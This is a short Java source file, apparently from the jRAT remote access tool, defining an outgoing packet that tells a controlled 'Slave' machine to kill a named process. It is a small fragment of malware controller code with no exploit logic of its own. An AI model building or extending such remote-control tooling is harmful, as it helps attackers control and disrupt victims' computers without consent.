package pro.jrat.client.packets.outgoing;

import java.io.DataOutputStream;

import pro.jrat.client.Slave;

public class Packet20KillProcess extends AbstractOutgoingPacket {

	private String process;

	public Packet20KillProcess(String process) {
		this.process = process;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(process);
	}

	@Override
	public byte getPacketId() {
		return 20;
	}

}